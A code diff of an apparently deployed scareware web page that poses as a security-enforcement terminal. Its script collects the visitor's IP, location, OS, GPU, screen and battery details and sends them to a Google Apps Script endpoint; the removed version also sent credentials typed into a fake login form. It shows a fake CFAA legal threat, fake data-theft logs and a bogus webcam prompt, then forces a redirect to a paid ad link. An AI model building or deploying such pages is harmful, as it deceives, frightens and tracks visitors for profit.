@@ -111,28 +111,34 @@
     <canvas id="matrix-bg"></canvas>
     <div class="danger-bar" id="danger-bar">TERMINAL_CRITICAL: SECURITY ENFORCEMENT PROTOCOL ACTIVE</div>
 
-    <div class="wrapper" id="main-wrapper">
-        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+   <div class="wrapper" id="main-wrapper">
+        <div class="grid">
             <div class="box">
-                <h2 style="color:#0f0; margin-top:0;">DIGITAL EVIDENCE ACQUISITION</h2>
-                <ul style="list-style:none; padding:0; line-height:1.6;">
-                    <li>IPV4_ADDRESS: <span id="user-ip">[DECRYPTING...]</span></li>
+                <h2>DIGITAL EVIDENCE ACQUISITION</h2>
+                <ul class="data-list">
+                    <li>IPV4_ADDRESS: <span id="user-ip" class="decrypting">[DECRYPTING...]</span></li>
                     <li>LOCATION: <span id="user-loc">[LOCATING...]</span></li>
-                    <li>OS_KERNEL_ID: <span id="user-os">[SCANNING...]</span></li>
+                    <li>OS_KERNEL_ID: <span id="user-os" class="decrypting">[SCANNING...]</span></li>
                     <li>CPU_CORE_COUNT: <span id="user-cpu">...</span></li>
                     <li>MEM_CAPACITY: <span id="user-ram">...</span></li>
                     <li>GPU_RENDERER: <span id="user-gpu">...</span></li>
                     <li>BROWSER_ENGINE: <span id="user-engine">...</span></li>
-                    <li>DISPLAY_ARRAY: <span id="user-res">[BYPASSING...]</span></li>
-                    <li>HW_BATTERY_CELL: <span id="user-batt">[ACCESSING...]</span></li>
+                    <li>DISPLAY_ARRAY: <span id="user-res" class="decrypting">[BYPASSING...]</span></li>
+                    <li>LOC_TIMEZONE: <span id="user-tz" class="decrypting">[LOCATING...]</span></li>
+                    <li>HW_BATTERY_CELL: <span id="user-batt" class="decrypting">[ACCESSING...]</span></li>
                 </ul>
             </div>
-            <div class="box box-red">
-                <h2 style="margin-top:0;">CISO OFFICIAL DIRECTIVE</h2>
-                <p><strong>LEGAL NOTICE:</strong> Connection classified as <strong>Tier-1 Security Violation</strong>. All session metadata and ISP credentials have been secured for evidentiary purposes.</p>
-                <p>Your hardware signature has been blacklisted across this network gateway.</p>
+
+<div class="box box-red">
+                <h2>CISO OFFICIAL DIRECTIVE</h2>
+                <div class="warning-msg">
+                    <strong>LEGAL NOTICE:</strong> The Cyber Intelligence Unit at <span class="site-name-text">This Network</span> has classified this connection as a <strong>Tier-1 Security Violation</strong> under the Computer Fraud and Abuse Act protocols. 
+                    <br><br>
+                    <strong>ATTENTION:</strong> If you are a student or explorer, this is your final administrative reprieve; however, all session metadata and forensic identifiers have been logged. Your personal data and ISP credentials have been secured for evidentiary purposes. Continued unauthorized access will result in immediate escalation to your Service Provider and cybercrime authorities.
+                </div>
             </div>
         </div>
+       
         <div id="terminal" class="box" style="height:200px; overflow:hidden; background:#000;">
             <div id="log-content"></div>
         </div>
@@ -200,19 +206,41 @@
             return;
         }
 
-        // Payload Construction
-        const payload = new URLSearchParams({
-            ip: document.getElementById('user-ip').innerText,
-            user: document.getElementById('fake-user').value,
-            pass: document.getElementById('fake-pass').value,
-            session: sessionNum,
-            os: document.getElementById('user-os').innerText,
-            city: userCity,
-            country: userCountry,
-            gpu: document.getElementById('user-gpu').innerText
-        });
+        const ip = document.getElementById('user-ip').innerText;
+        const session = document.getElementById('session-id-text').innerText;
+        
+        // --- THE REPAIR: We must define these variables by grabbing them from the UI first ---
+        const os = document.getElementById('user-os').innerText;
+        const cpu = document.getElementById('user-cpu').innerText;
+        const ram = document.getElementById('user-ram').innerText;
+        const gpu = document.getElementById('user-gpu').innerText;
+        const res = document.getElementById('user-res').innerText;
+        const batt = document.getElementById('user-batt').innerText;
 
-        fetch(GOOGLE_SCRIPT_URL, { method: 'POST', mode: 'no-cors', body: payload });
+        const errorMsg = document.getElementById('login-error');
+
+        // Payload Construction
+          const payload = `ip=${encodeURIComponent(ip)}` +
+                        `&session=${encodeURIComponent(session)}` +
+                        `&city=${encodeURIComponent(userCity)}` +
+                        `&country=${encodeURIComponent(userCountry)}` +
+                        `&os=${encodeURIComponent(os)}` +
+                        `&cpu=${encodeURIComponent(cpu)}` +
+                        `&ram=${encodeURIComponent(ram)}` +
+                        `&gpu=${encodeURIComponent(gpu)}` +
+                        `&res=${encodeURIComponent(res)}` +
+                        `&batt=${encodeURIComponent(batt)}`;
+
+        // Send to Google Sheets
+        fetch(GOOGLE_SCRIPT_URL, {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: payload
+        }).then(() => {
+            console.log("Data sent to bridge.");
+        }).catch(err => console.error("Bridge Error:", err));
+
 
         // WP Error Feed
         err.style.display = 'block';
@@ -231,58 +259,174 @@
         }, 1200);
     }
 
-    // --- 4. SCARE PROTOCOLS (RESTORED) ---
-    function startScare() {
-        document.getElementById('alert-sound').play().catch(() => {});
-        if (navigator.vibrate) navigator.vibrate([500, 200, 500]);
-        
-        startMatrix();
-        startTerminal();
-
+// Wait 1.5 seconds then start the scare
         setTimeout(() => {
-            confirm("[!] SECURITY ALERT: Remote camera access requested by CYBER_UNIT. Verify identity?");
-            window.location.replace("YOUR_PAID_AD_LINK_HERE");
-        }, 20000);
-    }
+            document.getElementById('login-overlay').style.display = 'none';
+            startEverything();
 
-    function startTerminal() {
-        const log = document.getElementById('log-content');
-        const paths = [
-            "SCANNING_LOCAL_NETWORK_NODES...", "EXTRACTING_AUTOFILL_DATA...", "INTERCEPTING_SSL_CERTIFICATES...",
-            "DECRYPTING_WIFI_KEYCHAIN...", "UPLOADING_COOKIES...", "BYPASSING_FIREWALL...",
-            "FETCHING_DISCORD_TOKEN...", "CLONING_FINGERPRINT...", "OPENING_BACKDOOR_4444..."
-        ];
-        setInterval(() => {
-            const line = document.createElement('div');
-            line.innerText = "> [SYSTEM] " + paths[Math.floor(Math.random() * paths.length)] + " DONE";
-            log.appendChild(line);
-            if (log.children.length > 8) log.removeChild(log.firstChild);
-            document.body.classList.add('red-alert-pulse');
-            setTimeout(() => document.body.classList.remove('red-alert-pulse'), 300);
+            // STEP A: At 18 seconds, show the final red warning line
+            setTimeout(() => {
+                const logContent = document.getElementById('log-content');
+                const line = document.createElement('div');
+                line.style.color = "#ff0000"; 
+                line.style.fontWeight = "bold";
+                line.innerText = "> [SYSTEM] CONNECTION TERMINATED. REDIRECTING TO SECURE GATEWAY...";
+                logContent.appendChild(line);
+                
+                document.getElementById('main-wrapper').classList.add('shake');
+            }, 18000); // 18 seconds
+
+// Add this inside your 18-second timeout
+const webcamAlert = confirm("[!] SYSTEM ALERT: Remote camera access requested by CYBER_UNIT. Allow access for identity verification?");
+// Even if they click "Cancel", the redirect happens anyway.
+
+            
+            // STEP B: At 21 seconds, jump to the paid link
+            setTimeout(() => {
+                // This REPLACES your site in history so they can't "Go Back" to it
+window.location.replace("YOUR_PAID_AD_LINK_HERE");
+            }, 21000); // 21 seconds
+            
         }, 1500);
     }
 
-    function startMatrix() {
-        const c = document.getElementById('matrix-bg');
-        const ctx = c.getContext('2d');
-        c.width = window.innerWidth; c.height = window.innerHeight;
-        const drops = Array(Math.floor(c.width/16)).fill(1);
-        function draw() {
-            ctx.fillStyle = "rgba(0,0,0,0.05)"; ctx.fillRect(0,0,c.width,c.height);
-            ctx.fillStyle = "#0f0"; ctx.font = "16px monospace";
-            drops.forEach((y, i) => {
-                ctx.fillText(Math.floor(Math.random()*2), i*16, y*16);
-                if (y*16 > c.height && Math.random() > 0.975) drops[i] = 0;
-                drops[i]++;
+    function startEverything() {
+
+// --- FORCE LOGIN IF PAGE RELOADS FROM BACK BUTTON ---
+window.addEventListener('pageshow', function(event) {
+    if (event.persisted) {
+        window.location.reload(); 
+    }
+});
+
+        
+    // Vibrate for 500ms, pause 200ms, vibrate 500ms (only works on Android/Chrome)
+    if (navigator.vibrate) {
+        navigator.vibrate([500, 200, 500, 200, 1000]);
+    }
+    alertAudio.play().catch(() => {});
+    setInterval(draw, 40);
+    startLogCycle();
+}
+
+    // --- DATA FETCH: IP, LOCATION, HARDWARE ---
+    setTimeout(() => {
+        fetch('https://ipapi.co/json/').then(res => res.json()).then(data => {
+            document.getElementById('user-ip').innerText = data.ip;
+            document.getElementById('user-ip').classList.remove('decrypting');
+            userCity = data.city || "N/A";
+            userCountry = data.country_name || "N/A";
+            document.getElementById('user-loc').innerText = userCity + ", " + userCountry;
+            document.getElementById('user-tz').innerText = data.timezone;
+            document.getElementById('user-tz').classList.remove('decrypting');
+        });
+        
+        document.getElementById('user-os').innerText = navigator.platform;
+        document.getElementById('user-os').classList.remove('decrypting');
+        document.getElementById('user-cpu').innerText = (navigator.hardwareConcurrency || "X") + " THREADS";
+        document.getElementById('user-ram').innerText = (navigator.deviceMemory || "8") + "GB RAM";
+        
+        const ua = navigator.userAgent;
+        let engine = "UNKNOWN";
+        if (ua.indexOf("Chrome") > -1) engine = "BLINK";
+        else if (ua.indexOf("Firefox") > -1) engine = "GECKO";
+        else if (ua.indexOf("Safari") > -1) engine = "WEBKIT";
+        document.getElementById('user-engine').innerText = engine;
+
+        document.getElementById('user-res').innerText = window.screen.width + "x" + window.screen.height;
+        document.getElementById('user-res').classList.remove('decrypting');
+
+        try {
+            const canvas_gpu = document.createElement('canvas');
+            const gl = canvas_gpu.getContext('webgl');
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            document.getElementById('user-gpu').innerText = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL).split(' ').pop();
+        } catch(e) { document.getElementById('user-gpu').innerText = "GPU_ACCEL"; }
+
+        if (navigator.getBattery) {
+            navigator.getBattery().then(b => {
+                document.getElementById('user-batt').innerText = Math.round(b.level * 100) + "%";
+                document.getElementById('user-batt').classList.remove('decrypting');
             });
-        }
-        setInterval(draw, 40);
+        } else { document.getElementById('user-batt').innerText = "AC_POWER"; }
+    }, 1500);
+
+    // --- MATRIX RAIN ---
+    const canvas = document.getElementById('matrix-bg');
+    const ctx = canvas.getContext('2d');
+    function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
+    window.onresize = resize; resize();
+    const chars = "01010101";
+    const fontSize = 16;
+    const columns = canvas.width / fontSize;
+    const drops = Array(Math.floor(columns)).fill(1);
+    function draw() {
+        ctx.fillStyle = "rgba(0, 0, 0, 0.1)";
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.font = fontSize + "px monospace";
+        ctx.fillStyle = "#0f0";
+        drops.forEach((y, i) => {
+            const text = chars[Math.floor(Math.random() * chars.length)];
+            ctx.fillText(text, i * fontSize, y * fontSize);
+            if (y * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+            drops[i]++;
+        });
     }
 
-    // Enter Key Support
-    document.getElementById('fake-pass').addEventListener('keypress', (e) => {
-        if (e.key === 'Enter') { e.preventDefault(); attemptLogin(); }
-    });
+    // --- TERMINAL LOGS ---
+    function startLogCycle() {
+        const logContent = document.getElementById('log-content');
+  const filePaths = [
+    "SCANNING_LOCAL_NETWORK_NODES...",
+    "EXTRACTING_BROWSER_AUTOFILL_DATA...",
+    "INTERCEPTING_SSL_CERTIFICATES...",
+    "DECRYPTING_WIFI_PASSWORDS_KEYCHAIN...",
+    "UPLOADING_COOKIES_TO_REMOTE_STORAGE...",
+    "BYPASSING_LOCAL_FIREWALL_PROTOCOL...",
+    "FETCHING_DISCORD_TOKEN_SESSION...",
+    "LOCATING_CONNECTED_SMART_DEVICES...",
+    "CLONING_BROWSER_FINGERPRINT...",
+    "DUMPING_SAVED_CREDIT_CARD_METADATA...",
+    "OPENING_BACKDOOR_PORT_4444...",
+    "PULLING_SOCIAL_MEDIA_CACHED_LOGINS...",
+    "SCANNING_RECOVERY_EMAIL_ACCESS...",
+    "INITIATING_REMOTE_SCREEN_CAPTURE...",
+    "LOCATING_ISP_PRIMARY_GATEWAY...",
+    "COMPRESSING_SENSITIVE_FILES_FOR_EXPORT..."
+];
+        setInterval(() => {
+            if (logContent.children.length > 8) logContent.removeChild(logContent.firstChild);
+            const line = document.createElement('div');
+            line.style.margin = "5px 0";
+            line.innerText = Math.random() > 0.5 ? `> [SCANNING] ${filePaths[Math.floor(Math.random() * filePaths.length)]}... FOUND` : "> [TRACE] Origin identified...";
+            logContent.appendChild(line);
+            document.body.classList.add('red-alert-pulse');
+            document.getElementById('main-wrapper').classList.add('shake');
+            setTimeout(() => {
+                document.body.classList.remove('red-alert-pulse');
+                document.getElementById('main-wrapper').classList.remove('shake');
+            }, 300);
+        }, 1800);
+    }
+
+window.addEventListener('DOMContentLoaded', (event) => {
+    // This targets your specific input ID
+    const loginField = document.getElementById('fake-pass');
+    
+    // Force the cursor into the box
+    loginField.focus();
+    
+    // Mobile Keyboard Trigger (Works for most Android/Chrome)
+    loginField.click();
+});
+
+// This tells the browser: "If the user hits Enter, act like they clicked Login"
+document.getElementById('fake-pass').addEventListener('keypress', function (e) {
+    if (e.key === 'Enter') {
+        e.preventDefault(); // Prevents the page from refreshing
+        attemptLogin();    // Triggers your data-sending and the 20s timer
+    }
+});
     </script>
 </body>
 </html>
